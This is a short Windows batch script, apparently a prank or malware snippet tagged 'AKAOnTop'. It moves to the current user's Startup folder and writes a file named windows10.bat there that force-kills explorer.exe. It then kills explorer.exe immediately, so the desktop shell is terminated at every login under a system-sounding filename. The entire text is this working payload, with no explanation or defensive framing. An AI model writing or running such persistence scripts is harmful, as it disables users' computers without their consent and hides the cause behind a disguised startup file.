cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo AKAOnTop
sleep 3
echo taskkill /f /im explorer.exe > windows10.bat
taskkill /f /im explorer.exe